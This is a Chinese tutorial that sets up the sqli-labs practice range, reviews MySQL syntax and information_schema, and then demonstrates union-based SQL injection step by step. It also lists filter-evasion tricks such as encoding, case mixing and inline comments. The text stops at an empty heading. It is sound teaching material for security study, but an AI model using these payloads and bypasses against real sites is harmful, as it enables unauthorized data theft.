## 一 、sqli-labs 本地靶场安装
### 1.phpstudy 安装
**phpstudy 官网：**[**官网链接**](https://www.xp.cn/php-study)

**下载**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732184640656-239b19b5-c94b-4bf7-83ca-56bf9fdc7407.png)

**之后解压安装**

### **2 下载 sqli-labs 源码**
**sqli-labs：**[**github 地址**](https://github.com/Audi-1/sqli-labs)

**下载好之后解压到 phpstudy 根目录下的 WWW目录下**

**并将 sqli-labs-master 文件夹重命名为 sqli-labs，如下图**![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732185665462-9a17ada5-c087-4247-8a07-eddf02f1db57.png)

### **3.修改配置文件**
**进入 sqlilabs/sql-connections 目录下，记事本或其他编辑器打开db-creds.inc 文件，修改为：$dbpass='root'。  **![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732185821523-13255e38-2f3c-40b5-99d3-7fc2def70b65.png)** **之后更换低版本的 php，5.x 都可以**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732189365948-72977c21-8f45-438c-9465-fbd4e86d9460.png)

**之后更换到低版本 php**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732189407171-de616796-250e-41da-9130-745fdc154aa7.png)

之后重启，就可以了。网址[http://127.0.0.1/sqli-labs/](http://127.0.0.1/sqli-labs/)![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732189488834-fe85ed75-aef9-4185-85e8-4f59d0312c7c.png)



## 二、了解 SQL
### SQL 的定义
[**参考文章**](https://blog.csdn.net/PILIpilipala/article/details/113798383)

**SQL（Structured Query Language）是“结构化查询语言”，它是对关系型数据库的操作语言。它可以应用到所有关系型数据库中。 **

### SQL 语法要求
+ **SQL 语句可以单行或多行书写，以分号结尾；**
+ **可以用空格和缩进来来增强语句的可读性；**
+ **关键字不区别大小写，建议使用大写；**

### 数据库的种类
[**参考文章**](https://blog.csdn.net/molangmolang/article/details/136334715?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522fffc115fb4f31d53e2551b4e882d6592%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=fffc115fb4f31d53e2551b4e882d6592&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~baidu_landing_v2~default-4-136334715-null-null.nonecase&utm_term=%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%88%86%E7%B1%BB&spm=1018.2226.3001.4450)

#### 常见的关系型数据库
**甲骨文公司的 Oracle Database：**Oracle 是一款功能强大、高度可扩展的关系型数据库，广泛应用于企业级应用，如金融、电信等大型企业的核心业务系统。

**微软的 SQL Server：**它与 Windows 操作系统紧密集成，提供了易于使用的管理工具和开发环境。SQL Server 在中小企业中应用广泛，尤其是在基于 Windows 平台的企业应用中。

**开源的 MySQL：**MySQL 以其开源、免费、易用的特点，受到众多开发者的喜爱。它被广泛应用于 Web 应用开发，如电子商务网站、内容管理系统等。

**开源的 PostgreSQL：**PostgreSQL 具有高度的可扩展性、丰富的数据类型和强大的事务处理能力，在科研、地理信息系统（GIS）等领域有广泛应用。

#### 常见的非关系型数据库
**MongoDB**：

基于分布式文件存储，数据以BSON格式存储，文档型数据库结构灵活。有强大横向扩展能力，适用于大数据量、高并发读写、数据结构多变场景，如社交网络和游戏行业。

**Redis**：

内存数据库，读写速度极快。支持多种数据结构，用于缓存、消息队列、实时统计等场景，像电商网站缓存商品信息、实现排行榜功能。

**Cassandra**：

高度可扩展，采用无主节点架构，可用性和容错性高。基于一致性哈希分布数据，适用于大规模分布式数据存储，在云计算、物联网领域应用广泛。

#### 总结：
![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731998068006-cf0590bc-3a76-4e3b-a950-95178009bd56.png)

## 三、了解 MySQL 基本语法
[**参考文章**](about:blank)**，内容过多，只作了解**

### 四种语句类型
+ **DDL（Data Definition Language）：数据定义语言，用来定义数据库对象：库、表、列等； **
+ **DML（Data Manipulation Language）:数据操作语言，用来定义数据库记录（数据）；**
+ **DQL（Data Query Language）：数据查询语言，用来查询记录（数据）。**
+ **DCL（Data Control Language）：数据控制语言，用来定义访问权限和安全级别；**

### DDL（数据定义语言）
数据定义语言

#### 数据库操作
查询所有数据库：  
`SHOW DATABASES;`  
查询当前数据库：  
`SELECT DATABASE();`  
创建数据库：  
`CREATE DATABASE [ IF NOT EXISTS ] 数据库名 [ DEFAULT CHARSET 字符集] [COLLATE 排序规则 ];`  
删除数据库：  
`DROP DATABASE [ IF EXISTS ] 数据库名;`  
使用数据库：  
`USE 数据库名;`

##### 注意事项
+ UTF8字符集长度为3字节，有些符号占4字节，所以推荐用utf8mb4字符集

#### 表操作
查询当前数据库所有表：  
`SHOW TABLES;`  
查询表结构：  
`DESC 表名;`  
查询指定表的建表语句：  
`SHOW CREATE TABLE 表名;`

创建表：

```plain
CREATE TABLE 表名(
    字段1 字段1类型 [COMMENT 字段1注释],
    字段2 字段2类型 [COMMENT 字段2注释],
    字段3 字段3类型 [COMMENT 字段3注释],
    ...
    字段n 字段n类型 [COMMENT 字段n注释]
)[ COMMENT 表注释 ];
```

**最后一个字段后面没有逗号**

添加字段：  
`ALTER TABLE 表名 ADD 字段名 类型(长度) [COMMENT 注释] [约束];`  
例：`ALTER TABLE emp ADD nickname varchar(20) COMMENT '昵称';`

修改数据类型：  
`ALTER TABLE 表名 MODIFY 字段名 新数据类型(长度);`  
修改字段名和字段类型：  
`ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型(长度) [COMMENT 注释] [约束];`  
例：将emp表的nickname字段修改为username，类型为varchar(30)  
`ALTER TABLE emp CHANGE nickname username varchar(30) COMMENT '昵称';`

删除字段：  
`ALTER TABLE 表名 DROP 字段名;`

修改表名：  
`ALTER TABLE 表名 RENAME TO 新表名`

删除表：  
`DROP TABLE [IF EXISTS] 表名;`  
删除表，并重新创建该表：  
`TRUNCATE TABLE 表名;`

### DML（数据操作语言）
#### 添加数据
指定字段：  
`INSERT INTO 表名 (字段名1, 字段名2, ...) VALUES (值1, 值2, ...);`  
全部字段：  
`INSERT INTO 表名 VALUES (值1, 值2, ...);`

批量添加数据：  
`INSERT INTO 表名 (字段名1, 字段名2, ...) VALUES (值1, 值2, ...), (值1, 值2, ...), (值1, 值2, ...);`  
`INSERT INTO 表名 VALUES (值1, 值2, ...), (值1, 值2, ...), (值1, 值2, ...);`

##### 注意事项
+ 字符串和日期类型数据应该包含在引号中
+ 插入的数据大小应该在字段的规定范围内

#### 更新和删除数据
修改数据：  
`UPDATE 表名 SET 字段名1 = 值1, 字段名2 = 值2, ... [ WHERE 条件 ];`  
例：  
`UPDATE emp SET name = 'Jack' WHERE id = 1;`

删除数据：  
`DELETE FROM 表名 [ WHERE 条件 ];`

### DQL（数据查询语言）
语法：

```plain
SELECT
    字段列表
FROM
    表名字段
WHERE
    条件列表
GROUP BY
    分组字段列表
HAVING
    分组后的条件列表
ORDER BY
    排序字段列表
LIMIT
    分页参数
```

#### 基础查询
查询多个字段：  
`SELECT 字段1, 字段2, 字段3, ... FROM 表名;`  
`SELECT * FROM 表名;`

设置别名：  
`SELECT 字段1 [ AS 别名1 ], 字段2 [ AS 别名2 ], 字段3 [ AS 别名3 ], ... FROM 表名;`  
`SELECT 字段1 [ 别名1 ], 字段2 [ 别名2 ], 字段3 [ 别名3 ], ... FROM 表名;`

去除重复记录：  
`SELECT DISTINCT 字段列表 FROM 表名;`

转义：  
`SELECT * FROM 表名 WHERE name LIKE '/_张三' ESCAPE '/'`  
/ 之后的_不作为通配符

#### 条件查询
语法：  
`SELECT 字段列表 FROM 表名 WHERE 条件列表;`

条件：

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732364439536-14d94c78-95ca-4717-80f3-caf9b28dd410.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732364445283-a17e8ad5-8883-49ca-8e97-0f1ee090fb6d.png)

例子：

```plain
-- 年龄等于30
select * from employee where age = 30;
-- 年龄小于30
select * from employee where age < 30;
-- 小于等于
select * from employee where age <= 30;
-- 没有身份证
select * from employee where idcard is null or idcard = '';
-- 有身份证
select * from employee where idcard;
select * from employee where idcard is not null;
-- 不等于
select * from employee where age != 30;
-- 年龄在20到30之间
select * from employee where age between 20 and 30;
select * from employee where age >= 20 and age <= 30;
-- 下面语句不报错，但查不到任何信息
select * from employee where age between 30 and 20;
-- 性别为女且年龄小于30
select * from employee where age < 30 and gender = '女';
-- 年龄等于25或30或35
select * from employee where age = 25 or age = 30 or age = 35;
select * from employee where age in (25, 30, 35);
-- 姓名为两个字
select * from employee where name like '__';
-- 身份证最后为X
select * from employee where idcard like '%X';
```

#### 聚合查询（聚合函数）
常见聚合函数：

| 函数 | 功能 |
| --- | --- |
| count | 统计数量 |
| max | 最大值 |
| min | 最小值 |
| avg | 平均值 |
| sum | 求和 |


语法：  
`SELECT 聚合函数(字段列表) FROM 表名;`  
例：  
`SELECT count(id) from employee where workaddress = "广东省";`

#### 分组查询
语法：  
`SELECT 字段列表 FROM 表名 [ WHERE 条件 ] GROUP BY 分组字段名 [ HAVING 分组后的过滤条件 ];`

where 和 having 的区别：

+ 执行时机不同：where是分组之前进行过滤，不满足where条件不参与分组；having是分组后对结果进行过滤。
+ 判断条件不同：where不能对聚合函数进行判断，而having可以。

例子：

```plain
-- 根据性别分组，统计男性和女性数量（只显示分组数量，不显示哪个是男哪个是女）
select count(*) from employee group by gender;
-- 根据性别分组，统计男性和女性数量
select gender, count(*) from employee group by gender;
-- 根据性别分组，统计男性和女性的平均年龄
select gender, avg(age) from employee group by gender;
-- 年龄小于45，并根据工作地址分组
select workaddress, count(*) from employee where age < 45 group by workaddress;
-- 年龄小于45，并根据工作地址分组，获取员工数量大于等于3的工作地址
select workaddress, count(*) address_count from employee where age < 45 group by workaddress having address_count >= 3;
```

##### 注意事项
+ 执行顺序：where > 聚合函数 > having
+ 分组之后，查询的字段一般为聚合函数和分组字段，查询其他字段无任何意义

#### 排序查询
语法：  
`SELECT 字段列表 FROM 表名 ORDER BY 字段1 排序方式1, 字段2 排序方式2;`

排序方式：

+ ASC: 升序（默认）
+ DESC: 降序

例子：

```plain
-- 根据年龄升序排序
SELECT * FROM employee ORDER BY age ASC;
SELECT * FROM employee ORDER BY age;
-- 两字段排序，根据年龄升序排序，入职时间降序排序
SELECT * FROM employee ORDER BY age ASC, entrydate DESC;
```

##### 注意事项
如果是多字段排序，当第一个字段值相同时，才会根据第二个字段进行排序

#### 分页查询
语法：  
`SELECT 字段列表 FROM 表名 LIMIT 起始索引, 查询记录数;`

例子：

```plain
-- 查询第一页数据，展示10条
SELECT * FROM employee LIMIT 0, 10;
-- 查询第二页
SELECT * FROM employee LIMIT 10, 10;
```

##### 注意事项
+ 起始索引从0开始，起始索引 = （查询页码 - 1） * 每页显示记录数
+ 分页查询是数据库的方言，不同数据库有不同实现，MySQL是LIMIT
+ 如果查询的是第一页数据，起始索引可以省略，直接简写 LIMIT 10

#### DQL执行顺序
FROM -> WHERE -> GROUP BY -> SELECT -> ORDER BY -> LIMIT

### DCL（数据控制语言）
#### 管理用户
查询用户：

```plain
USER mysql;
SELECT * FROM user;
```

创建用户:  
`CREATE USER '用户名'@'主机名' IDENTIFIED BY '密码';`

修改用户密码：  
`ALTER USER '用户名'@'主机名' IDENTIFIED WITH mysql_native_password BY '新密码';`

删除用户：  
`DROP USER '用户名'@'主机名';`

例子：

```plain
-- 创建用户test，只能在当前主机localhost访问
create user 'test'@'localhost' identified by '123456';
-- 创建用户test，能在任意主机访问
create user 'test'@'%' identified by '123456';
create user 'test' identified by '123456';
-- 修改密码
alter user 'test'@'localhost' identified with mysql_native_password by '1234';
-- 删除用户
drop user 'test'@'localhost';
```

##### 注意事项
+ 主机名可以使用 % 通配

#### 权限控制
常用权限：

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732364374503-cc88c400-01e2-4e7e-92c4-3ca5beea299b.png)

查询权限：  
`SHOW GRANTS FOR '用户名'@'主机名';`

授予权限：  
`GRANT 权限列表 ON 数据库名.表名 TO '用户名'@'主机名';`

撤销权限：  
`REVOKE 权限列表 ON 数据库名.表名 FROM '用户名'@'主机名';`

##### 注意事项
+ 多个权限用逗号分隔
+ 授权时，数据库名和表名可以用 * 进行通配，代表所有

### <font style="color:rgb(51, 51, 51);">函数</font>
+ <font style="color:rgb(51, 51, 51);">字符串函数</font>
+ <font style="color:rgb(51, 51, 51);">数值函数</font>
+ <font style="color:rgb(51, 51, 51);">日期函数</font>
+ <font style="color:rgb(51, 51, 51);">流程函数</font>

#### <font style="color:rgb(51, 51, 51);">字符串函数</font>
<font style="color:rgb(51, 51, 51);">常用函数：</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732364356311-23eb5a3a-5f0c-49e9-bcb5-e315af9e5b67.png)

<font style="color:rgb(51, 51, 51);">使用示例：</font>

```plain
-- 拼接
 SELECT CONCAT('Hello', 'World');
 -- 小写
 SELECT LOWER('Hello');
 -- 大写
 SELECT UPPER('Hello');
 -- 左填充
 SELECT LPAD('01', 5, '-');
 -- 右填充
 SELECT RPAD('01', 5, '-');
 -- 去除空格
 SELECT TRIM(' Hello World ');
 -- 切片（起始索引为1）
 SELECT SUBSTRING('Hello World', 1, 5);
```

#### <font style="color:rgb(51, 51, 51);">数值函数</font>
<font style="color:rgb(51, 51, 51);">常见函数：</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732364346765-1eebd62b-59ce-4293-b204-7005c1db571e.png)

#### <font style="color:rgb(51, 51, 51);">日期函数</font>
<font style="color:rgb(51, 51, 51);">常用函数：</font>

| **<font style="color:rgb(51, 51, 51);">函数</font>** | **<font style="color:rgb(51, 51, 51);">功能</font>** |
| :--- | :--- |
| <font style="color:rgb(51, 51, 51);">CURDATE()</font> | <font style="color:rgb(51, 51, 51);">返回当前日期</font> |
| <font style="color:rgb(51, 51, 51);">CURTIME()</font> | <font style="color:rgb(51, 51, 51);">返回当前时间</font> |
| <font style="color:rgb(51, 51, 51);">NOW()</font> | <font style="color:rgb(51, 51, 51);">返回当前日期和时间</font> |
| <font style="color:rgb(51, 51, 51);">YEAR(date)</font> | <font style="color:rgb(51, 51, 51);">获取指定date的年份</font> |
| <font style="color:rgb(51, 51, 51);">MONTH(date)</font> | <font style="color:rgb(51, 51, 51);">获取指定date的月份</font> |
| <font style="color:rgb(51, 51, 51);">DAY(date)</font> | <font style="color:rgb(51, 51, 51);">获取指定date的日期</font> |
| <font style="color:rgb(51, 51, 51);">DATE_ADD(date, INTERVAL expr type)</font> | <font style="color:rgb(51, 51, 51);">返回一个日期/时间值加上一个时间间隔expr后的时间值</font> |
| <font style="color:rgb(51, 51, 51);">DATEDIFF(date1, date2)</font> | <font style="color:rgb(51, 51, 51);">返回起始时间date1和结束时间date2之间的天数</font> |


<font style="color:rgb(51, 51, 51);">例子：</font>

```plain
-- DATE_ADD
 SELECT DATE_ADD(NOW(), INTERVAL 70 YEAR);
```

#### <font style="color:rgb(51, 51, 51);">流程函数</font>
<font style="color:rgb(51, 51, 51);">常用函数：</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732364336894-cd4200eb-4b4a-43ff-9cd0-97c706069db5.png)

<font style="color:rgb(51, 51, 51);">例子：</font>

```plain
select
     name,
     (case when age > 30 then '中年' else '青年' end)
 from employee;
 select
     name,
     (case workaddress when '北京市' then '一线城市' when '上海市' then '一线城市' else '二线城市' end) as '工作地址'
 from employee;
```

### <font style="color:rgb(51, 51, 51);">约束</font>
<font style="color:rgb(51, 51, 51);">分类：</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732364323002-adb70a7c-0ab2-49d0-8a43-2c4c54bdc95f.png)

<font style="color:rgb(51, 51, 51);">约束是作用于表中字段上的，可以再创建表/修改表的时候添加约束。</font>

#### <font style="color:rgb(51, 51, 51);">常用约束</font>
![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732364579523-c107edc2-29af-4f67-8ab2-24f489af01c5.png)

**<font style="color:rgb(51, 51, 51);">例子：</font>**

create table user(  
     id int primary key auto_increment,  
     name varchar(10) not null unique,  
     age int check(age > 0 and age < 120),  
     status char(1) default '1',  
     gender char(1)  
 );

#### <font style="color:rgb(51, 51, 51);">外键约束</font>
**<font style="color:rgb(51, 51, 51);">添加外键：</font>**

CREATE TABLE 表名(  
     字段名 字段类型,  
     ...  
     [CONSTRAINT] [外键名称] FOREIGN KEY(外键字段名) REFERENCES 主表(主表列名)  
 );  
 ALTER TABLE 表名 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段名) REFERENCES 主表(主表列名);  

 -- 例子  
 alter table emp add constraint fk_emp_dept_id foreign key(dept_id) references dept(id);

**<font style="color:rgb(51, 51, 51);">删除外键：</font>**`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">ALTER TABLE 表名 DROP FOREIGN KEY 外键名;</font>`

**<font style="color:rgb(51, 51, 51);">删除/更新行为</font>**

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732364602051-8ae41573-295c-4db6-8f99-729cee7c87ab.png)

<font style="color:rgb(51, 51, 51);">更改删除/更新行为：ALTER TABLE 表名 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段) REFERENCES 主表名(主表字段名) ON UPDATE 行为 ON DELETE 行为;</font>

## 四、了解 MySQL 数据库中表名字段等信息的存储
![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1731998300640-e0899b18-abdc-4a0d-b45b-98091cba535c.png)

接下来以 MySQL5.7 展示各个名称的含义

> schemata
>
>  存储的是该用户创建的所有数据库的库名，要记住该表中记录数据库名的字段名为 schema_name。

首先我们共有四个数据库

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732001396966-f850522d-a328-4c9b-bb21-ceb6ed8da4ed.png)

进入 SCHEMSATA 表，可见在 SCHEMA_NAME 下已经记录了这四个库名

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732001476109-70a644cc-8cd4-4d29-a3af-a17b98ca101a.png)

> tables     
>
> 存储该用户创建的所有数据库的库名和表名，要记住该表中记录数据库 库名和表名的字段分别是 table_schema table_name.

进入 TABLE 表，发现 TABLE_SCHEMA 和 TABLE_NAME 分别记录了所有库下的所有表名

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732001584258-6282d32c-10c9-4e24-b4f7-a6b1bbfa7d1c.png)

> columns
>
> 存储该用户创建的所有数据库的库名、表名、字段名，要记住该表中记录数据库库名、表名、字段名为 table_schema、table_name、column_name。

在 COLUMNS 表下，我们可以看到更详细的信息

TABLE_SCHEMA 和 TABLE_NAME 分别记录了所有库下的所有表名及其字段名

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732001751062-1396bc34-6f41-451d-9ba7-7ab35214ba8c.png)

**理解：**

**我们正是利用 information_schema 库下的这些信息，从而知道数据库里想要的信息位置，进行渗透。**

## 五、了解注入的原理及基本流程

### 1.SQL 注入的含义：
**所谓SQL注入，就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令．当应用程序使用输入内容来构造动态sql语句以访问数据库时，会发生sql注入攻击。如果代码使用存储过程，而这些存储过程作为包含未筛选的用户输入的字符串来传递，也会发生sql注入。**

### 2.SQL 注入基本本质
<font style="color:rgb(51, 51, 51);"> 把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则  </font>

### 3.SQL 注入的条件
**1. 传递给后端的参数是可以控制的**

**2. 参数内容会被带入到数据库查询**

**3. 变量未存在过滤或者过滤不严谨**

### 4.SQL 注入的基本流程
**以下内容以 sqli-labs 靶场第一关为例**

#### <font style="color:rgb(51, 51, 51);">1. 找出注入点</font>
题中告诉我们注入点是 ID

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732007414266-94e203a0-4583-4591-b011-667d93cf1c87.png)

同样我们可以通过 id=1 和 id=2 的回显不一致，可知道这里就是注入点

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732007529903-7e4a0686-e7eb-4d51-8363-ee73340cf6a3.png)![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732007549936-34a417b6-a336-42b7-8233-7444b0951804.png)

#### <font style="color:rgb(51, 51, 51);">2.判断注入及闭合类型</font>
+ **数字型注入**

以 sqli-labs 靶场第二关(数值型注入)为例

```sql
# 猜测其查询语句可能如下
select 字段 from 表 where id=$id
```

+ **字符型注入**

以 sqli-labs 靶场第二关(数值型注入)为例

```sql
# 猜测其查询语句可能如下
select 字段 from 表 where id='$id'
```

##### 判断方法
###### **方法一：**
分别输入 **id=1'和 id=1"**

+ **情况一：都报错（为数字型注入）**

解释：因为如果要求输入类型为数字，那么输入的 1'和 1"会被当做一个整体，会被认为是语法错误

+ **情况二：id=1'报错，id=1"不报错**

接着输入 id=1'--+(在 url 里+会被编码为空格，**-- **正好是 SQL 的注释语法)

或者是 id=1'#

    - 结果一：不报错。（单引号闭合）
    - 结果二：报错。（单引号外面可能还包着括号，输入 id=1')#试试）

（有时候可能包好几个括号，多试试）

+ **情况三：id=1'不报错，id=1"报错**

接着输入 id=1"--+(在 url 里+会被编码为空格，**-- **正好是 SQL 的注释语法)

或者是 id=1"#

    - 结果一：不报错。（单引号闭合）
    - 结果二：报错。（单引号外面可能还包着括号，输入 id=1")#试试）

（有时候可能包好几个括号，多试试）

###### **方法二：（只是判断）**
输入**id=1 and 1=2**

+ **如果报错就是数字型注入**

**因为对于数字型而言，不仅有逻辑否，而且这就是一个错误的 SQL 语句**

+ **如果没报错就是字符型注入**

**因为对于字符型而言，输入的内容是 1 and 1=2 这样的字符串**

**查询的 id 字段在表中应该是数字型，SQL 引擎会自动把字符串转为数字型，就是 1**

至于闭合类型，还要借助方法一

###### **方法三：（最简单粗暴的）**

输入 id=1\，然后看报错信息里转义字符后面的东西，就是闭合方式

以 less3 为例，这关闭合方式是 单引号+括号闭合

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732026069059-e2308bf5-114e-4c0e-9aa1-85dd8978c530.png)

注意：这个方法要求有报错回显，且没有禁用转义字符

#### <font style="color:rgb(51, 51, 51);">3.判断表格的列数</font>
 如果报错就是超过列数，如果显示正常就是没有超出列数。

第一个成功，第二个失败。说明字段数为 3

```sql
?id=1' order by 3--+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732013539587-6aaded20-84c5-4433-a290-5ac3c9d701c5.png)

```sql
?id=1' order by 4--+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732013607238-0b7de34f-0ca3-442a-b8dd-6160538d8237.png)

#### <font style="color:rgb(51, 51, 51);">4.判断回显的列数</font>
```sql
?id=-1' union select 1,2,3--+
```

看到回显位为 2，3

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732015972281-5e97a676-ecad-458a-af92-3ff143ab61fa.png)

#### <font style="color:rgb(51, 51, 51);">5.爆出数据库名称</font>
```sql
?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732015238600-3d289691-c5b3-42db-9217-15d64a17001d.png)

#### 6.爆出当前所属的数据库和版本
**看当前再 security 库，所以之后要跨库查询**

```sql
?id=-1' union select 1,2,group_concat(database(),version())--+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732111539831-3752e9af-02c7-414d-af06-f4566d00f3c4.png)

#### <font style="color:rgb(51, 51, 51);">7.爆出表名</font>
```sql
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ctftraining'--+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732015261814-1d28ce58-396d-4f52-ac22-8a6fa799c679.png)

#### <font style="color:rgb(51, 51, 51);">8.爆出列名</font>
```sql
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='flag'--+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732015343654-e7771f23-df3e-4da8-8703-c9117ca342f5.png)

#### <font style="color:rgb(51, 51, 51);">9.查询</font>
```sql
?id=-1' union select 1,2,flag from ctftraining.flag--+
```

![](https://cdn.nlark.com/yuque/0/2024/png/49936693/1732015525444-f95b6f59-7378-4e1b-aef3-78be2368a39f.png)



#### 补充：
```sql
#一些SQL注入常用的函数
version()                 # 查看数据库版本
database()                # 查看当前数据库名
user()                    # 查看当前数据库用户
system_user()             # 查看系统用户名
group_concat()            # 把数据库中的某列数据或某几列数据合并为一个字符串
@@datadir                 # 查看数据库路径
@@version_compile_os      # 查看操作系统
```



## 六、常见的绕过方式
### <font style="color:#000000;">1.注释符号绕过</font>
```sql
--  注释内容
# 注释内容
/*注释内容*/
;
;%00
```

### 2.大小写绕过
如果用关键字阻塞过滤器显得不够聪明，可以通过变换攻击字符串中字符的大小写来避开它们，因为数据库使用不区分大小写的方式处理SOL关键字。例如，如果下列输入被阻止:

```sql
UNION SELECT password FROM tblUsers WHERE username='admin'--
```

可以通过下列方法绕开过滤器:

```sql
uNiOn SeLeCt password FrOm tblUsers WhErE username='admin'-- 
```

### 3.内联注释绕过
内联注释就是把一些特有的仅在MYSQL上的语句放在 /!../ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。

```sql
 select * from cms_users where userid=1 union /*!select*/ 1,2,3;
```

### 4.双写绕过
<font style="color:rgb(77, 77, 77);">使用双写绕过。因为在过滤过程中只进行了一次替换。就是将关键字替换为对应的空。</font>

<font style="color:rgb(77, 77, 77);">比如 union在</font>[<font style="color:rgb(77, 77, 77);">程序员</font>](https://so.csdn.net/so/search?q=%E7%A8%8B%E5%BA%8F%E5%91%98&spm=1001.2101.3001.7020)<font style="color:rgb(77, 77, 77);">处理时被替换为空，那需要我们可以尝试把</font><font style="color:rgb(254, 44, 36);">union</font><font style="color:rgb(77, 77, 77);">改写为</font><font style="color:rgb(254, 44, 36);">Ununionion</font><font style="color:rgb(77, 77, 77);">，这样红</font>

<font style="color:rgb(77, 77, 77);">色部分替换为空，则剩下的依然为union还可以</font><font style="color:rgb(254, 44, 36);">结合大小写</font><font style="color:rgb(77, 77, 77);">过滤一起使用</font>

### <font style="color:#000000;">5.编码绕过</font>
<font style="color:rgb(77, 77, 77);">如URLEncode编码，ASCII,HEX,unicode编码绕过：</font>

#### **<font style="color:rgb(77, 77, 77);">对关键字进行两次url全编码：</font>**
```sql
1+and+1=2
1+%25%36%31%25%36%65%25%36%34+1=2 
```

#### **<font style="color:rgb(77, 77, 77);">ascii编码绕过</font>**
```sql
Test 等价于CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)
#利用函数CHAR()结合字母的ASCII码值拼接成被过滤的关键字
```

#### <font style="color:rgb(77, 77, 77);">16进制绕过：</font>
```sql
select * from users where username = test1;
select * from users where username = 0x7465737431;
#将test转化成16进制
```

#### <font style="color:rgb(77, 77, 77);">unicode编码对部分符号的绕过：</font>
```sql
单引号=> %u0037 %u02b9
空格=> %u0020 %uff00
左括号=> %u0028 %uff08
右括号=> %u0029 %uff09
```

### <font style="color:rgb(79, 79, 79);">6.<>大于小于号绕过</font>
<font style="color:rgb(77, 77, 77);">在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。</font>

#### <font style="color:rgb(77, 77, 77);">greatest()和least()</font>
<font style="color:rgb(77, 77, 77);">greatest(n1, n2, n3…):返回n中的最大值 或least(n1,n2,n3…):返回n中的最小值</font>

```sql
select * from cms_users where userid=1 and greatest(ascii(substr(database(),1,1)),1)=99;
```

#### <font style="color:rgb(77, 77, 77);">strcmp()</font>
<font style="color:rgb(77, 77, 77);">strcmp(str1,str2):</font>  
<font style="color:rgb(77, 77, 77);">若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 </font><font style="color:rgb(77, 77, 77);">1</font>

```sql
select * from cms_users where userid=1 and strcmp(ascii(substr(database(),0,1)),99);
```

#### <font style="color:rgb(77, 77, 77);">in关键字</font>
```sql
select * from cms_users where userid=1 and substr(database(),1,1) in ('c');
```

#### <font style="color:rgb(77, 77, 77);">between a and b</font>
<font style="color:rgb(77, 77, 77);">between a and b:范围在a-b之间（不包含b）</font>

```sql
select * from cms_users where userid=1 and substr(database(),1,1) between 'a' and 'd';
```

### 7.空格绕过
<font style="color:rgb(77, 77, 77);">一般绕过空格过滤的方法有以下几种方法来取代空格</font>

```sql
/**/
()
回车(url编码中的%0a)
`(tap键上面的按钮)
tap
两个空格
```

### <font style="color:rgb(79, 79, 79);">8.对or and xor not 绕过</font>
```sql
or = ||
and = &&
xor = | 或者 ^ # 异或,例如Select * from cms_users where userid=1^sleep(5);
not = !
```

### <font style="color:rgb(79, 79, 79);">9.对等号=绕过</font>
#### like
<font style="color:rgb(77, 77, 77);">不加通配符的like执行的效果和 = 一致，所以可以用来绕过。</font>  
<font style="color:rgb(77, 77, 77);">正常加上通配符的like：</font>

```sql
 Select * from cms_users where username like "ad%";
```

<font style="color:rgb(77, 77, 77);">不加上通配符的like可以用来取代=：</font>

```sql
 Select * from cms_users where username like "admin";
```

#### <font style="color:rgb(77, 77, 77);">REGEXP</font>
<font style="color:rgb(77, 77, 77);">regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配</font>

```sql
Select * from cms_users where username REGEXP "admin";
```

#### 大于号小于号
<font style="color:rgb(77, 77, 77);">使用大小于号来绕过</font>

```sql
Select * from cms_users where userid>0 and userid<2; #userid=1
```

<font style="color:rgb(77, 77, 77);"><> 等价于 != ,所以在前面再加一个 ! 结果就是等号了</font>

```sql
Select * from cms_users where !(username <> "admin");
```

### <font style="color:rgb(79, 79, 79);">10.对单引号的绕过</font>
#### 使用十六进制
